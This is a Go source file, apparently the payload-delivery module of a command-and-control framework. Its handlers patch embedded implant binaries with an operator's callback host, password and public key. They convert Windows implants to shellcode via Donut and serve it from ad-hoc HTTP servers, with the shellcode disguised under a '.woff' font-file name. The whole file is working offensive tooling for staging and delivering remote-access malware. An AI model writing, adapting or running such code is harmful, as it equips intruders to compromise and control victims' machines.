package api

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"BackendTemplate/pkg/logger"
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strings"
	"sync"
)

var WebDeliveryServer = make(map[string]*http.Server)
var Mutex sync.Mutex

func ListWebDelivery(c *gin.Context) {
	var webs []database.WebDelivery
	database.Engine.Find(&webs)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": webs})
}
func StartWebDelivery(c *gin.Context) {
	var web struct {
		Listener string `json:"listener"`
		OS       string `json:"os"`
		Arch     string `json:"arch"`
		Port     string `json:"port"`
		Filename string `json:"filename"`
		Pass     string `json:"pass"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err})
		return
	}
	var w database.WebDelivery
	if exist, _ := database.Engine.Where("listening_port = ?", web.Port).Exist(&w); exist {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口已被配置"})
		return
	}

	inUse, err := isPortInUse(web.Port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", web.Port, err)
	}
	if inUse {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
		return
	}

	osType := web.OS
	archType := web.Arch

	listenerTmp := strings.Split(web.Listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	// 查找符合条件的文件
	binaryFileName := findBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
		return
	}
	// 从嵌入的文件系统中读取对应文件内容
	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
		return
	}
	var modifiedData []byte
	if listenerType == "oss" {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")

		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)

		// 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))

	} else {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")                // 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}
	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := padRight(web.Pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := padRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	mux := http.NewServeMux()
	mux.HandleFunc("/"+web.Filename, func(w http.ResponseWriter, r *http.Request) {
		// 设置响应头，指定内容类型为二进制流
		w.Header().Set("Content-Type", "application/octet-stream")
		// 设置响应头，指定下载文件的名称
		w.Header().Set("Content-Disposition", "attachment; filename="+web.Filename)
		// 写入字节码到响应体
		w.Write(modifiedData)
	})

	if web.OS == "windows" {
		shellcode, err := godonut.GenShellcode(modifiedData, web.Pass, web.Arch)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
			return
		}
		mux.HandleFunc("/"+web.Filename+".woff", func(w http.ResponseWriter, r *http.Request) {
			// 设置响应头，指定内容类型为二进制流
			w.Header().Set("Content-Type", "application/octet-stream")
			// 设置响应头，指定下载文件的名称
			w.Header().Set("Content-Disposition", "attachment; filename="+web.Filename+".woff")
			// 写入字节码到响应体
			w.Write(shellcode)
		})

	}
	tmp := strings.Split(connectAddress, ":")
	database.Engine.Insert(&database.WebDelivery{
		ListenerConfig: web.Listener,
		OS:             web.OS,
		Arch:           web.Arch,
		ListeningPort:  web.Port,
		Status:         1,
		FileName:       web.Filename,
		ServerAddress:  "http://" + tmp[0] + ":" + web.Port + "/" + web.Filename,
		Pass:           web.Pass,
	})

	server := &http.Server{
		Addr:    ":" + web.Port,
		Handler: mux,
	}

	// 存储服务器实例
	Mutex.Lock()
	WebDeliveryServer[web.Port] = server
	Mutex.Unlock()

	// 启动服务器（非阻塞）
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Println(err)
		}
	}()

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
func CloseWebDelivery(c *gin.Context) {
	var web struct {
		Port string `json:"port"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err})
		return
	}
	err := WebDeliveryServer[web.Port].Close()
	Mutex.Lock()
	delete(WebDeliveryServer, web.Port)
	Mutex.Unlock()
	database.Engine.Where("listening_port = ?", web.Port).Update(&database.WebDelivery{Status: 2})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func OpenWebDelivery(c *gin.Context) {
	var web struct {
		Port string `json:"port"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err})
	}
	inUse, err := isPortInUse(web.Port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", web.Port, err)
	}
	if inUse {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
		return
	}
	var webdelivery database.WebDelivery
	database.Engine.Where("listening_port = ?", web.Port).Get(&webdelivery)

	osType := webdelivery.OS
	archType := webdelivery.Arch

	listenerTmp := strings.Split(webdelivery.ListenerConfig, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	// 查找符合条件的文件
	binaryFileName := findBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
	}
	// 从嵌入的文件系统中读取对应文件内容
	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
	}

	var modifiedData []byte
	if listenerType == "oss" {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")

		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)

		// 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))

	} else {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")                // 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}
	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := padRight(webdelivery.Pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := padRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	mux := http.NewServeMux()
	mux.HandleFunc("/"+webdelivery.FileName, func(w http.ResponseWriter, r *http.Request) {
		// 设置响应头，指定内容类型为二进制流
		w.Header().Set("Content-Type", "application/octet-stream")
		// 设置响应头，指定下载文件的名称
		w.Header().Set("Content-Disposition", "attachment; filename="+webdelivery.FileName)
		// 写入字节码到响应体
		w.Write(modifiedData)
	})
	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", web.Port).Get(&wd)
	if wd.OS == "windows" {
		shellcode, err := godonut.GenShellcode(modifiedData, wd.Pass, wd.Arch)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
		}
		mux.HandleFunc("/"+wd.FileName+".woff", func(w http.ResponseWriter, r *http.Request) {
			// 设置响应头，指定内容类型为二进制流
			w.Header().Set("Content-Type", "application/octet-stream")
			// 设置响应头，指定下载文件的名称
			w.Header().Set("Content-Disposition", "attachment; filename="+wd.FileName+".woff")
			// 写入字节码到响应体
			w.Write(shellcode)
		})
	}

	database.Engine.Where("listening_port = ?", web.Port).Update(&database.WebDelivery{Status: 1})
	server := &http.Server{
		Addr:    ":" + web.Port,
		Handler: mux,
	}

	// 存储服务器实例
	Mutex.Lock()
	WebDeliveryServer[web.Port] = server
	Mutex.Unlock()

	// 启动服务器（非阻塞）
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error(err.Error())
		}
	}()

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})

}

func DeleteWebDelivery(c *gin.Context) {
	var web struct {
		Port string `json:"port"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err})
	}
	var webdelivery database.WebDelivery
	database.Engine.Where("listening_port = ?", web.Port).Get(&webdelivery)
	if webdelivery.Status == 1 {
		err := WebDeliveryServer[web.Port].Close()
		Mutex.Lock()
		delete(WebDeliveryServer, web.Port)
		Mutex.Unlock()
		database.Engine.Where("listening_port = ?", web.Port).Delete(&database.WebDelivery{})
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	}
	database.Engine.Where("listening_port = ?", web.Port).Delete(&database.WebDelivery{})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
